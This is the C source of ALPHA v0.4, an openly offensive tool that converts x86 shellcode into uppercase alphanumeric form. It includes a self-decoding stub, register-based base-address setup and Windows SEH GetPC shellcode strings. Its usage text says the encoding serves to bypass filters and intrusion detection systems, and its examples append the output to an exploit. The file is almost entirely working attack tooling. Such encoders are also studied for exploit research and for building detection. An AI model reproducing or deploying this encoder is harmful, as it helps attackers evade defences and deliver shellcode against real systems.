//ALPHA_04.c
/*
      ,sSSs,,s,  ALPHA v0.4 beta.
     SS"  Y$P"
    iS'   dY     Captitalized alphanumeric shellcode encoding.
    YS,  dSb     Copyright (C) 2004 by Berend-Jan Wever.
    `"YSS'"S'    < skylined@edup.tudelft.nl>
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include "alphanumeric_opcodes_defines.h"

#define xorcode1    0x41
#define xorcode2    0x3f
#define IMUL        "\x6b"
#define CONST_0x10  "\x10"
#define JNE         "\x75"

//-----------------------------------------------------------------------------
struct baseaddress_options_struct {
  char* option; // name of option
  char* code; // the code
} baseaddress_options[] = {
//   We're using "xor offset(%edx), %al" and similar instructions for xor-
//   patching and decoding the origional code to keep it all alphanumeric.
//   %edx and %ecx must point to the baseaddess of the shellcode, we add one of
//   the following pieces of code to set the %ecx and %edx register.
//   Since offset must be at least 0x30, we can't patch any instructions before
//   baseaddress+0x30 without tricks. We could offcourse just add padding but
//   then we'd have useless bytes in our decoder taking up space. We can also
//   lower %edx and %ecx to reach these otherwise unreachable instructions: The
//   "dec %edx" and "dec %ecx" instructions combine padding and decreasing to
//   reduce the size of the decoder.
  { "eax",      PUSH_EAX POP_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX
                PUSH_EDX POP_ECX  },
  { "ebx",      PUSH_EBX POP_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX
                PUSH_EDX POP_ECX  },
  { "ecx",      DEC_ECX  DEC_ECX  DEC_ECX  DEC_ECX  DEC_ECX  DEC_ECX  PUSH_ECX
                POP_EDX  },
  { "edx",      DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  PUSH_EDX
                POP_ECX  },
  { "esp",      PUSH_ESP POP_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX
                PUSH_EDX POP_ECX  },
  { "ebp",      PUSH_EBP POP_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX
                PUSH_EDX POP_ECX  },
  { "esi",      PUSH_ESI POP_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX
                PUSH_EDX POP_ECX  },
  { "edi",      PUSH_EDI POP_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX
                PUSH_EDX POP_ECX  },
  { "[esp-8]",  DEC_ESP  DEC_ESP  DEC_ESP  DEC_ESP  DEC_ESP  DEC_ESP  DEC_ESP
                DEC_ESP  POP_EDX  DEC_EDX  PUSH_EDX POP_ECX  },
  { "[esp-4]",  DEC_ESP  DEC_ESP  DEC_ESP  DEC_ESP  POP_EDX  DEC_EDX  DEC_EDX
                DEC_EDX  PUSH_EDX POP_ECX  },
  { "[esp]",    POP_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  PUSH_EDX
                POP_ECX  },
  { "[esp+4]",  INC_ESP  INC_ESP  INC_ESP  INC_ESP  POP_EDX  DEC_EDX  DEC_EDX
                DEC_EDX  PUSH_EDX POP_ECX  },
  { "[esp+8]",  INC_ESP  INC_ESP  INC_ESP  INC_ESP  INC_ESP  INC_ESP  INC_ESP
                INC_ESP  POP_EDX  DEC_EDX  PUSH_EDX POP_ECX  },
  { NULL, NULL }
};

char* decoder_allowed_chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
// 'Z' terminates decoding and is thus not allowed in the encoded data.
char* encoded_allowed_chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXY";
// Taken from the win32 SEH GetPC project. This code uses fs to get the current
// SEH address and overwrites it with a new SEH. Then it causes an exception,
// passing execution to the new SEH. This SEH can determine the location where
// the exception took place from the information provided about the exception.
// It then transfers execution back to the code behind the exception, passing
// the location of that code along in %ecx. Should work 100% of the time.
char* w32SEHGetPC_code =
  "VTX630VXH49HHHPhYAAQhZYYYYAAQQDDDd36FFFFTXVj0PPTUPPa301089";
// The uppercase version of this code can not use %fs. It will assume the start
// of the SEH chain is at the top of the stack and you have not used more then
// 65536 bytes of stack. It will take %esp and set the lower two bytes to
// 0xffe4. The resulting address SHOULD point to the last SEH in the chain,
// which it will overwrite and call similair to the "normal" win32 SEH GetPC.
// Remember that it hyjacks the LAST SEH, if an earlier SEH handles the
// exception, the code will not work! Should work 99.9% of the time.
char* w32SEHGetPC_uppercase_code =
  "VTX630WTX638VXH49HHHPVX5AAQQPVX5YYYYP5YYYD5KKYAPTTX638TDDNVDDX4Z4A63861816";

//-----------------------------------------------------------------------------
char* decoder_code_skeleton =
// Asume %edx = %ecx = baseaddress - baseaddress_adjust (see above)

// Get a 0x0 in a register ----------------------------------------------------
      PUSH_ESI                          // %esi = 0x0
      PUSH_ESP
      POP_EAX
      SS XOR32_X_ ESI_MEAX              // xor   %ss:(%eax), %esi

// XOR-patching ---------------------------------------------------------------
      PUSH_ESI
      POP_EAX
      XOR_AL_I_ "A"                     // al = xorcode1
      // decode 0x10 for imul instruction
      XOR8_ AL_MEDX_O8_ "a"             // xor %al, offset_0x10(%edx)
      // decode 0x6b for imul instruction
      DEC_EAX DEC_EAX                   // %al = xorcode2 (space saver ;)
      XOR8_ AL_MEDX_O8_ "b"             // xor %al, offset_imul(%edx)
      // decode 0x75 for jne instruction
      XOR8_ AL_MEDX_O8_ "c"             // xor %al, offset_jne(%edx)

      // The "c"(+1) also marks beginning of the decoder loop!

// Decode byte1 into low nibble -----------------------------------------------
      // Read
      PUSH_ESI                          // %eax = 0x0
      POP_EAX
      XOR8_X_ AL_MEDX_O8_ "#"           // xor bufferoffset(%edx), %al  (byte1)
      INC_EDX
      // Decode
      DEC_EAX                           // %al--                      (byte1-1)
      XOR_AL_I_ "\x41"                  // %al ^=0x41               (lownibble)
      // Store
      XOR8_X_ AL_MECX_O8_ "#"           // xor bufferoffset(%ecx), %al
      XOR8_ AL_MECX_O8_ "#"             // xor %al, bufferoffset(%ecx)

// Decode byte2 into high nibble ----------------------------------------------
      // Read and decode in one ;)         imul $0x10, bufferoffset(%edx), %eax
      IMUL EAX_MEDX_O8_ "#" CONST_0x10  // %al = byte2 * 0x10  (highnibble)
      INC_EDX
      // Store
      XOR8_ AL_MECX_O8_ "#"             // xor %al, bufferoffset(%ecx)
      INC_ECX

// While loop, checks for terminating 'Z' -------------------------------------
      PUSH_ESI                          // %eax = '0'
      POP_EAX
      XOR_AL_I_ "Z"                     // xor $0x30, %al
      CMP8_ AL_MEDX_O8_ "#"             // cmp %al, bufferoffset(%edx)

      JNE "de";

//-----------------------------------------------------------------------------
void fprintf_spaces(FILE *stream, int length) {
  while(length-- > 0) fprintf(stream, " ");
}

//-----------------------------------------------------------------------------
void fprintf_banner(FILE* stream) {
  fprintf(stream, "\n\
______________________________________________________________________________\n\
\n\
      ,sSSs,,s,  ALPHA v0.4 beta.\n\
     SS\"  Y$P\"\n\
    iS'   dY     Captitalized alphanumeric shellcode encoding.\n\
    YS,  dSb     Copyright (C) 2003, 2004 by Berend-Jan Wever.\n\
    `\"YSS'\"S'    < skylined@edup.tudelft.nl>\n\
______________________________________________________________________________\n\
\n\
");
}
//-----------------------------------------------------------------------------
void fprintf_usage(FILE* stream, char* name) {
  fprintf(stream, "\n\
Usage: %s OPTIONS\n\
  Reads shellcode from stdin and encodes it to stdout to contain only uppercase\n\
  alphanumeric characters (0-9 and A-Z).\n\
\n\
  The result consist of a decoder and encoded shellcode data, it is a fully\n\
  working uppercase alphanumeric version of the origional shellcodecode. This\n\
  encoding can be used to bypass filters or IDS systems.\n\
  The decoder needs to know it's exact baseaddress, you can specify where the\n\
  shellcode can get it's baseaddress from with the -r, -w or -W options.\n\
\n\
Options:\n\
  -c CHARACTER STRING          Specify a set of prefered characters, the\n\
                               encoded data will contain as many of these\n\
                               characters as possible. You can even supply\n\
                               lowercase and non-alphanumeric characters.\n\
  -b REGISTER|STACK LOCATION   Specify the register or stack location that will\n\
                               contain the baseaddress. Accepted values are:\n\
                               eax, ebx, ecx, edx, esi, edi, esp, ebp, [esp-8],\n\
                               [esp-4], [esp], [esp+4], [esp+8]\n\
  -w, -W                       Add code to calculate the baseaddress using the\n\
                               Structured Exception Handler (SEH). This only\n\
                               works on Microsft Windows operating systems.\n\
                               The -w options adds code that will allways work \n\
                               but has lowercase characters in it. The -W\n\
                               option adds code that will work 99%% of the time\n\
                               but is 100%% uppercase. See source code for\n\
                               details.\n\
\n\
Examples:\n\
  cat shellcode | %s -b eax > encoded_shellcode\n\
  cat shellcode | %s -w | encoded_win32_shellcode\n\
  cat shellcode | %s -b [esp-4] -c abcdefghijklmnopqrstuvwxyz >> exploit\n\
\n\
", name, name, name, name);
}


char* find_baseaddress_code(char* option) {
  int i = 0;
  while(baseaddress_options[i].option) {
    if (strcasecmp(option, baseaddress_options[i].option) == 0 )
      return baseaddress_options[i].code;
    i++;
  }
  fprintf_banner(stderr);
  fprintf(stderr, "Error: baseaddress code for '%s' not found!\n", option);
  exit(-1);
}

//-----------------------------------------------------------------------------
int main(int argc, char* argv[], char* envp[]) {
  char  *GetPC_code = "",
        *baseaddress_code = "",
        *decoder_code = "";
  int   GetPC_code_size = 0,
        baseaddress_code_size = 0,
        decoder_code_size = 0;
  int   origional_code_size, encoded_data_size, total_size;

  extern char *optarg;
  int   opt;

  int   i;
  int   input, lownibble, highnibble, lownibble_encoded, highnibble_encoded;

  int   baseaddress_adjust;
  int   offset_xor_patch_0x10, offset_0x10,
        offset_xor_patch_imul, offset_imul,
        offset_xor_patch_jne,  offset_jne,
        offset_start_loop, offset_end_loop, offset_loop,
        offset_buffer;
  char  *prefered_encode_chars = "";

  // Random seed
  struct timeval tv;
  struct timezone tz;
  gettimeofday(&tv, &tz);
  srand((int)tv.tv_sec*tv.tv_usec);

  // Parse command line arguments
  while ( (opt = getopt(argc, argv, "b:c:wW?")) != -1) {
    switch (opt) {
      case 'b':
        // baseaddress
        baseaddress_code = find_baseaddress_code(optarg);
      break;
      case 'c':
        // prefered characters
        prefered_encode_chars = optarg;
        // 'Z' terminates decoding and is thus never allowed.
        if (strchr(prefered_encode_chars, 'Z') != 0 ) {
          fprintf_banner(stderr);
          fprintf(stderr, "Error: allowed characters cannot contain 'Z'.\n");
          exit(-1);
        }
      break;
      case 'w':
        // add Windows SEH GetPC code
        GetPC_code = w32SEHGetPC_code;
        baseaddress_code = find_baseaddress_code("ecx");
      break;
      case 'W':
        // add uppercase Windows SEH GetPC code
        GetPC_code = w32SEHGetPC_uppercase_code;
        baseaddress_code = find_baseaddress_code("ecx");
      break;
      case '?':
        fprintf_banner(stdout);
        fprintf_usage(stdout, argv[0]);
        exit(0);
    }
  }
  // Calculate size of sme parts of the code and create a writeable
  // copy of the decoder.
  GetPC_code_size = strlen(GetPC_code);
  baseaddress_code_size = strlen(baseaddress_code);
  decoder_code_size = strlen(decoder_code_skeleton);
  decoder_code = (char*)malloc(decoder_code_size);
  strcpy(decoder_code, decoder_code_skeleton);

  // Check if required information was provided on the command-line
  if (baseaddress_code_size==0) {
    fprintf_banner(stderr);
    fprintf_usage(stderr, argv[0]);
    exit(-1);
  }

  baseaddress_adjust = 0;
  for(i=0; i< baseaddress_code_size; i++)
    if (baseaddress_code[i] == *DEC_EDX ||
        baseaddress_code[i] == *DEC_ECX )
      baseaddress_adjust++;

  // Calculate some offsets and set them in the decoder
  offset_xor_patch_0x10 = (int)strchr(decoder_code, 'a') - (int)decoder_code;
  offset_xor_patch_imul = (int)strchr(decoder_code, 'b') - (int)decoder_code;
  offset_xor_patch_jne  = (int)strchr(decoder_code, 'c') - (int)decoder_code;
  offset_start_loop     = offset_xor_patch_jne+1;
  offset_imul           = (int)strchr(decoder_code, *IMUL) - (int)decoder_code;
  offset_0x10           = (int)strchr(decoder_code, 0x10) - (int)decoder_code;
  offset_jne            = (int)strchr(decoder_code, *JNE) - (int)decoder_code;
  offset_buffer         = offset_jne+1;
  offset_end_loop       = offset_jne+2;

  // The code needs to be xor_patched to be alpha numeric
  decoder_code[offset_0x10] ^= xorcode1;
  decoder_code[offset_imul] ^= xorcode2;
  decoder_code[offset_jne]  ^= xorcode2;

  // The xor_patches need to know the offset where to patch the code.
  decoder_code[offset_xor_patch_0x10] = (char)(baseaddress_code_size
                                         + offset_0x10 + baseaddress_adjust);
  decoder_code[offset_xor_patch_imul] = (char)(baseaddress_code_size
                                         + offset_imul + baseaddress_adjust);
  decoder_code[offset_xor_patch_jne]  = (char)(baseaddress_code_size
                                         + offset_jne + baseaddress_adjust);

  // A lot of instructions in the decoder need the offset of the buffer from
  // the start of the code, adjusted for the "dec %edx" optimization.
  while (strchr( decoder_code, '#') != 0) {
    *(char*)strchr( decoder_code, '#') = (char)(baseaddress_code_size
                                          + offset_buffer
                                          + baseaddress_adjust);
  }

  // The "jne" loop has a negative offset, which is not alphanumeric. But
  // since the decoder has allready decoded the first byte before the jne
  // is reached, we can encode it as if it was part of the shellcode.
  offset_loop = offset_start_loop - offset_end_loop;
  lownibble = (offset_loop & 0xf);
  highnibble = (offset_loop & 0xf0) >>4;
  lownibble_encoded = (lownibble ^ 0x41) + 1;
  highnibble_encoded = (highnibble == 0x0 ? 0x50 : highnibble+0x40);
  decoder_code[offset_buffer] = (char)lownibble_encoded;
  decoder_code[offset_buffer+1] = (char)highnibble_encoded;

  // Check decoder for bad characters:
  for (i=0;i< strlen(decoder_code);i++)
    if (!strchr(decoder_allowed_chars, decoder_code[i])) {
      fprintf(stderr, "Build error: The decoder contains bad characters!\n"
                      "byte #%d: 0x%02x\n\n", i, (unsigned int)decoder_code[i]);
      exit(-1);
    }

  // Output GetPC_code, baseaddress_code and decoder_code:
  printf("%s%s%s", GetPC_code, baseaddress_code, decoder_code);

  // Output encoded shellcode:
  origional_code_size = 0;
  encoded_data_size = 2;
  while ((input = getchar()) != EOF) {
    origional_code_size++;
    encoded_data_size+=2;
    lownibble = (input & 0x0f);
    highnibble = (input & 0xf0) >> 4;
    lownibble_encoded  = (lownibble ^ 0x41) + 1;

    // the upper 4 bits of highnibble are discarded during decoding, so you can
    // put anything in them as long as it's alphanumeric.
    i = rand() % strlen(encoded_allowed_chars);
    while((encoded_allowed_chars[i] & 0xf) != highnibble) {
      i++; i %= strlen(encoded_allowed_chars);
    }
    highnibble_encoded = encoded_allowed_chars[i];

    if (strlen(prefered_encode_chars) != 0) {
      for(i=0;i< strlen(prefered_encode_chars); i++) {
        if ((prefered_encode_chars[i] & 0xf) == highnibble) {
          highnibble_encoded = prefered_encode_chars[i];
          break;
        }
      }
    }

    printf("%c%c", lownibble_encoded, highnibble_encoded);
  }
  // Output end of data marker:
  printf("Z");

  fprintf_banner(stderr);
  total_size = GetPC_code_size+baseaddress_code_size+decoder_code_size
               +encoded_data_size;
  fprintf(stderr, "Origional code       : %d bytes.\n", origional_code_size);
  if (GetPC_code_size > 0)
    fprintf(stderr, "  GetPC code         : %d bytes.\n", GetPC_code_size);
  fprintf(stderr, "  Baseaddress code   : %d bytes, baseaddress adjustment= "
                  "%d.\n", baseaddress_code_size, -baseaddress_adjust);
  fprintf(stderr, "  Decoder code       : %d bytes.\n", decoder_code_size);
  fprintf(stderr, "  Encoded data       : %d bytes.\n", encoded_data_size);
  fprintf(stderr, "Total resulting code : %d bytes (%.0f%% of origional).\n",
                  total_size, (double)100*total_size/origional_code_size);
  return 0;
}
